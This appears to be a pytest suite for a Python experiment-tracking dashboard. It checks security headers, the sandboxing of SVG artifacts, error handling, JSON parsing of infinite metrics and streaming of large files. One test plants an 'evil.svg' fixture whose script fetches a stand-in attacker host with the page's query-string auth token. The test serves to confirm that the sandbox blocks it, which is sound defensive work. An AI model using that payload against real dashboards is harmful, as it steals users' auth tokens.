"""Security headers on dashboard responses — end-to-end over a real socket.

Unlike test_dashboard_security.py (which drives do_GET/do_POST with a stubbed
end_headers), these tests run an actual HTTPServer and read the headers off
the wire, because the headers are attached in DashboardHandler.end_headers and
a stubbed harness would never see them.

The load-bearing case is test_svg_file_is_sandboxed: an SVG artifact is a live
document served same-origin, and fileUrl() puts the auth token in the query
string, so without the sandbox a hostile .svg in the project tree is script
execution with the token in location.search.
"""
from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from http.server import HTTPServer

import pytest

from exptrack.dashboard.handler import DashboardHandler


@pytest.fixture
def live_server(tmp_project):
    """Run a real dashboard on an ephemeral port; yield its base URL."""
    server = HTTPServer(("127.0.0.1", 0), DashboardHandler)
    server.allowed_host = "127.0.0.1"
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_port}"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def _get(url):
    """Fetch a URL, returning (status, headers, body) without raising on 4xx."""
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


# ── baseline headers on every response ──────────────────────────────────────

@pytest.mark.parametrize("path", ["/", "/api/stats", "/static/dashboard.js"])
def test_security_headers_on_every_response(live_server, path):
    _, headers, _ = _get(live_server + path)
    assert headers["X-Content-Type-Options"] == "nosniff"
    assert headers["Referrer-Policy"] == "no-referrer"
    assert "Content-Security-Policy" in headers


def test_error_responses_carry_headers(live_server):
    """send_error bypasses _send_bytes but still renders HTML, so it needs them."""
    status, headers, _ = _get(live_server + "/api/nonexistent-route")
    assert status == 404
    assert headers["X-Content-Type-Options"] == "nosniff"
    assert "default-src 'none'" in headers["Content-Security-Policy"]


# ── the HTML shell ──────────────────────────────────────────────────────────

def test_html_shell_csp_allows_inline_but_blocks_external(live_server):
    _, headers, _ = _get(live_server + "/")
    csp = headers["Content-Security-Policy"]
    # The UI is built on inline on* handlers, so this must stay allowed.
    assert "script-src 'self' 'unsafe-inline'" in csp
    # ...but nothing may reach an external origin, be framed, or rebase URLs.
    assert "default-src 'self'" in csp
    assert "connect-src 'self'" in csp
    assert "frame-ancestors 'none'" in csp
    assert "base-uri 'none'" in csp
    assert "object-src 'none'" in csp


def test_html_shell_still_renders(live_server):
    """The CSP must not be so strict the app cannot load its own bundles."""
    status, _, body = _get(live_server + "/")
    assert status == 200
    assert b"/static/dashboard.js" in body
    assert b"/static/dashboard.css" in body


# ── /api/file/ sandboxing (the SVG XSS fix) ─────────────────────────────────

def test_svg_file_is_sandboxed(live_server, tmp_project):
    """A hostile SVG artifact must not be able to run script on our origin."""
    outputs = tmp_project / "outputs"
    outputs.mkdir(exist_ok=True)
    (outputs / "evil.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<script>fetch("//attacker.test?t="+location.search)</script>'
        "</svg>"
    )
    status, headers, _ = _get(live_server + "/api/file/outputs/evil.svg")
    assert status == 200
    csp = headers["Content-Security-Policy"]
    # `sandbox` with no allow-scripts disables scripting; with no
    # allow-same-origin the document lands in an opaque origin and cannot
    # read the dashboard's storage even if it somehow executed.
    assert "sandbox" in csp
    assert "allow-scripts" not in csp
    assert "allow-same-origin" not in csp
    assert "default-src 'none'" in csp


def test_png_file_still_served_and_sandboxed(live_server, tmp_project):
    """The sandbox must not break ordinary image artifacts."""
    outputs = tmp_project / "outputs"
    outputs.mkdir(exist_ok=True)
    png = bytes.fromhex("89504e470d0a1a0a")  # PNG magic is enough here
    (outputs / "plot.png").write_bytes(png)
    status, headers, body = _get(live_server + "/api/file/outputs/plot.png")
    assert status == 200
    assert body == png
    assert headers["Content-Type"] == "image/png"
    assert "sandbox" in headers["Content-Security-Policy"]


def test_svg_inline_styles_still_allowed(live_server, tmp_project):
    """Matplotlib SVG output uses inline <style>; the policy must permit it."""
    outputs = tmp_project / "outputs"
    outputs.mkdir(exist_ok=True)
    (outputs / "fig.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg"/>')
    _, headers, _ = _get(live_server + "/api/file/outputs/fig.svg")
    assert "style-src 'unsafe-inline'" in headers["Content-Security-Policy"]


# ── a route bug must be a status code, not a dropped connection ─────────────

def _post(url, body):
    req = urllib.request.Request(url, data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def test_route_exception_returns_500(live_server, monkeypatch, capsys):
    """An unhandled exception in a route used to close the socket with no response.

    The caller then saw a bare disconnect — nothing the dashboard's error bar
    or curl could report. It must be a readable status instead.
    """
    from exptrack.dashboard.routes import write_routes

    def boom(*a, **k):
        raise RuntimeError("simulated route bug")

    monkeypatch.setattr(write_routes, "api_all_studies", boom)
    status, _ = _post(live_server + "/api/all-studies", {})
    assert status == 500


def test_json_number_does_not_crash_a_route(live_server, tmp_project):
    """Routes assumed every body field was a string, because the dashboard's
    own JS only ever sends strings. A client sending correct JSON types hit
    .strip() on a float and took the connection down with it."""
    from exptrack.core import Experiment

    exp = Experiment(name="typed-body")
    exp.finish()

    # value as a JSON number, not a string
    status, payload = _post(live_server + f"/api/experiment/{exp.id}/log-metric",
                            {"key": "acc", "value": 0.87})
    assert status == 200, f"numeric value crashed the route: {payload}"
    assert "error" not in payload, payload

    # and it is stored as the number it is
    from exptrack.core import get_db
    row = get_db().execute(
        "SELECT value FROM metrics WHERE exp_id=? AND key='acc'", (exp.id,)
    ).fetchone()
    assert row and abs(row["value"] - 0.87) < 1e-9


def test_body_str_coerces_without_changing_string_behaviour():
    from exptrack.dashboard.routes.write_routes._shared import body_str

    assert body_str({"k": "  hi  "}, "k") == "hi"      # unchanged for strings
    assert body_str({"k": 0.8}, "k") == "0.8"          # the crash case
    assert body_str({"k": 42}, "k") == "42"
    assert body_str({}, "k") == ""                     # absent -> default
    assert body_str({}, "k", "done") == "done"
    assert body_str({"k": None}, "k", "done") == "done"  # JSON null means absent


# ── the CSP default fails closed ────────────────────────────────────────────

def test_end_headers_defaults_to_the_strict_policy():
    """A caller that passes no policy must get the most restrictive one.

    The permissive policies are opt-in per response, so the default is what a
    future byte-serving route gets if it forgets to choose — including
    send_error, which calls end_headers() with no arguments.
    """
    from exptrack.dashboard.handler import _CSP_STRICT

    h = object.__new__(DashboardHandler)
    emitted = []
    h.send_header = lambda k, v: emitted.append((k, v))
    h.request_version = "HTTP/1.1"
    h._headers_buffer = []
    h.wfile = type("W", (), {"write": staticmethod(lambda b: None)})()

    DashboardHandler.end_headers(h)
    assert ("Content-Security-Policy", _CSP_STRICT) in emitted
    assert h._responded is True   # end_headers is the one point every response passes


def test_api_response_is_not_loosened_by_an_earlier_shell_request(live_server):
    """The shell's permissive policy must not carry over to an API response."""
    _get(live_server + "/")
    _, headers, _ = _get(live_server + "/api/stats")
    assert headers["Content-Security-Policy"] == "default-src 'none'; frame-ancestors 'none'"


# ── favicon ──────────────────────────────────────────────────────────────────

def test_favicon_is_served_at_both_spellings(live_server):
    """Browsers request /favicon.ico unprompted on every page load — it 404'd on
    every visit before the icon existed. Both spellings resolve to the one SVG."""
    for path in ("/favicon.ico", "/favicon.svg"):
        status, headers, body = _get(live_server + path)
        assert status == 200, path
        assert headers["Content-Type"] == "image/svg+xml", path
        assert b"<svg" in body, path


def test_favicon_needs_no_auth_and_caches_hard(live_server):
    """A <link rel=icon> cannot carry a Bearer token, so the icon is auth-exempt
    like the bundles — and immutable, so it is fetched once."""
    _, headers, _ = _get(live_server + "/favicon.ico")
    assert "immutable" in headers["Cache-Control"]


# ── responses must be parseable by JSON.parse, not just json.loads ──────────

def _strict_json(body: bytes):
    """Parse like JSON.parse: the NaN/Infinity extension is not JSON."""
    def _reject(token):
        raise ValueError(f"non-standard JSON token: {token}")
    return json.loads(body.decode(), parse_constant=_reject)


@pytest.fixture
def run_with_infinite_metric(tmp_project):
    """A run holding a non-finite metric, as older exptrack versions stored.

    ``Experiment.log_metric`` refuses one now, but that guard postdates a lot
    of stored data and none of the other ``INSERT INTO metrics`` paths has it,
    so the row is written directly — which is exactly the state a user's older
    project is already in. (SQLite coerces NaN to NULL on write; ±inf it keeps,
    so inf is the case that reaches the encoder.)
    """
    from exptrack.core import Experiment
    from exptrack.core.db import get_db

    exp = Experiment(name="diverged")
    exp.log_metric("loss", 2.0, step=0)
    exp.finish()

    conn = get_db()
    conn.execute(
        "INSERT INTO metrics (exp_id, key, value, step, ts, source) "
        "VALUES (?,?,?,?,?,?)",
        (exp.id, "loss", float("inf"), 1, "2026-01-01T00:00:00+00:00", "auto"),
    )
    conn.commit()
    return exp.id


@pytest.mark.parametrize("route", ["/api/metrics/", "/api/experiment/"])
def test_non_finite_metric_does_not_break_the_response(
    live_server, run_with_infinite_metric, route
):
    """One inf value used to make the *whole* body unparseable in the browser.

    /api/experiment/<id> failing that way is why the detail panel reported
    "Experiment not found", and /api/metrics/<id> failed alongside it — the
    pair of symptoms this guards against.
    """
    status, _, body = _get(live_server + route + run_with_infinite_metric)
    assert status == 200
    assert b"Infinity" not in body
    parsed = _strict_json(body)  # raises if the extension tokens are present
    assert parsed
    # (`error` on the experiment payload is the run's stored traceback slot,
    # not a route failure — what must not appear is a lookup failure.)
    assert parsed.get("error") != "not found"


def test_non_finite_metric_reads_back_as_null(live_server, run_with_infinite_metric):
    """The finite points survive; the meaningless one becomes a chart gap."""
    _, _, body = _get(live_server + "/api/metrics/" + run_with_infinite_metric)
    values = [p["value"] for p in _strict_json(body)["loss"]]
    assert 2.0 in values
    assert None in values


# ── large user files must not be read whole into memory ─────────────────────

def test_large_log_is_served_as_a_tail_window(live_server, tmp_project):
    """A tee'd training log runs to hundreds of MB and the viewer renders its
    last 500 lines, so serving the whole file cost a request thread that much
    RAM to produce a window the client then had to find by scanning it."""
    from exptrack.dashboard import handler as h

    outputs = tmp_project / "outputs"
    outputs.mkdir(exist_ok=True)
    big = outputs / "stdout.log"
    line = "x" * 99 + "\n"
    n = (h._TEXT_PREVIEW_MAX_BYTES // len(line)) + 500
    big.write_text("".join(f"{i:06d}" + line[6:] for i in range(n)))
    total = big.stat().st_size

    status, headers, body = _get(live_server + "/api/file/outputs/stdout.log")

    assert status == 200
    assert headers["X-Exptrack-Truncated"] == "tail"
    assert int(headers["X-Exptrack-Total-Bytes"]) == total
    assert len(body) <= h._TEXT_PREVIEW_MAX_BYTES
    assert int(headers["Content-Length"]) == len(body)
    # The end of the file — what a log viewer is for — and no partial first line.
    assert body.endswith(f"{n - 1:06d}".encode() + line[6:].encode())
    assert body.split(b"\n", 1)[0].strip()
    assert len(body.split(b"\n", 1)[0]) == len(line) - 1


def test_large_csv_is_served_from_the_head(live_server, tmp_project):
    """A CSV's header row is the first line, and the viewer shows the first
    200 rows — a tail window would lose the column names."""
    from exptrack.dashboard import handler as h

    outputs = tmp_project / "outputs"
    outputs.mkdir(exist_ok=True)
    big = outputs / "metrics.csv"
    rows = ["step,loss,acc\n"]
    rows += [f"{i},0.5,0.9\n" for i in range(h._TEXT_PREVIEW_MAX_BYTES // 12 + 500)]
    big.write_text("".join(rows))

    status, headers, body = _get(live_server + "/api/file/outputs/metrics.csv")

    assert status == 200
    assert headers["X-Exptrack-Truncated"] == "head"
    assert body.startswith(b"step,loss,acc\n")
    assert body.endswith(b"\n"), "window must end on a line boundary"
    assert len(body) <= h._TEXT_PREVIEW_MAX_BYTES


def test_small_text_file_is_served_whole_and_unflagged(live_server, tmp_project):
    outputs = tmp_project / "outputs"
    outputs.mkdir(exist_ok=True)
    (outputs / "notes.txt").write_text("all of it\n")

    status, headers, body = _get(live_server + "/api/file/outputs/notes.txt")

    assert status == 200
    assert body == b"all of it\n"
    assert "X-Exptrack-Truncated" not in headers


def test_file_body_is_streamed_not_read_whole(live_server, tmp_project, monkeypatch):
    """Memory must not scale with the served file — no single read() of it."""
    from exptrack.dashboard import handler as h

    outputs = tmp_project / "outputs"
    outputs.mkdir(exist_ok=True)
    payload = bytes.fromhex("89504e470d0a1a0a") + b"\x00" * (h._STREAM_CHUNK * 3)
    (outputs / "big.png").write_bytes(payload)

    sizes = []
    real_stream = h.DashboardHandler._send_stream

    def spy(self, fh, length, *a, **kw):
        class _Counting:
            def read(_s, n):
                chunk = fh.read(n)
                sizes.append(len(chunk))
                return chunk
        return real_stream(self, _Counting(), length, *a, **kw)

    monkeypatch.setattr(h.DashboardHandler, "_send_stream", spy)

    status, _, body = _get(live_server + "/api/file/outputs/big.png")

    assert status == 200
    assert body == payload
    assert sizes and max(sizes) <= h._STREAM_CHUNK
    assert len(sizes) >= 3, "whole file went out in one read"
